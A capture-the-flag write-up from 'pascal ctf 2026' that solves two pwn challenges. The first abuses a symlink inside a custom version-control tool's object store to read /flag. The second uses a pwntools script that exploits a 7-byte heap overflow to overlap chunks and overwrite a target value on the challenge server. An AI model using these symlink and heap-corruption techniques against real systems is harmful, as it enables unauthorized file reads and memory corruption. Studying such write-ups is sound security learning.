# pascal ctf 2026

## Grande Inutile Tool
<primary-label ref="pwn"/>

Using symlink to arb file read

```sh
cd /dev/shm
rm -rf x; mkdir x; cd x
mkdir -p .mygit/objects .mygit/commits .mygit/refs/heads
echo "refs/heads/main" > .mygit/HEAD
ln -s /flag .mygit/objects/flagfile

python3 -c '
import os,time
def h(d):
    d=d if isinstance(d,bytes)else d.encode();h1,h2=0x1505,0
    for b in d:h1=((h1*0x21)^b)&0xFFFFFFFFFFFFFFFF;h2=((h2*0x1f)+b)&0xFFFFFFFFFFFFFFFF
    h1^=len(d);h2^=len(d)*0x11
    return f"{h1&0xFFFFFFFF:08x}{h2&0xFFFFFFFF:08x}{(h1^h2)&0xFFFFFFFF:08x}{((h1+h2)*7)&0xFFFFFFFF:08x}{((h1-h2)*0xd)&0xFFFFFFFF:08x}"
obj_hash="flagfile";out_path="./f";ts=int(time.time())
commit=f"timestamp {ts}\nmessage x\nfiles 1\n{obj_hash} {out_path}\n";ch=h(commit)
open(f".mygit/commits/{ch}","w").write(commit)
open(".mygit/refs/heads/p","w").write(ch+"\n")
'

mygit checkout p
cat f
```

## AHC - Average Heap Challenge
<primary-label ref="pwn"/>

the bug was 7bytes bof in heap
1. alloc 0x50 chunk for 5 times to fill free list
2. free index 3
3. realloc 0x50 chunk and overwrite index 4 chunk's size 0x50->0x70
4. free index 4
5. alloc 0x70 chunk that is overlapped to the target chunk

```py
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

def conn():
    if True:
        return remote("ahc.ctf.pascalctf.it", 9003)
    else:
        return process('./chall')

def create(p, idx, extra_len, name, msg):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'at: ', str(idx).encode())
    p.sendlineafter(b'need? ', str(extra_len).encode())
    p.sendlineafter(b'name: ', name)
    p.sendlineafter(b'message: ', msg)

def delete(p, idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'from: ', str(idx).encode())

def check_win(p):
    p.sendlineafter(b'> ', b'5')

p = conn()

for i in range(5):
    create(p, i, 0, b'A', b'B')

delete(p, 3)

name_payload = b'A' * 39
msg_payload = b'X' * 32 + b'\x71' + b'\x00' * 6

create(p, 3, 0, name_payload, msg_payload)

delete(p, 4)

target_value = p64(0xDEADBEEFCAFEBABE)
name_payload2 = b'Y' * 10
msg_payload2 = b'Z' * 16 + target_value
create(p, 4, 32, name_payload2, msg_payload2)

check_win(p)

p.interactive()

```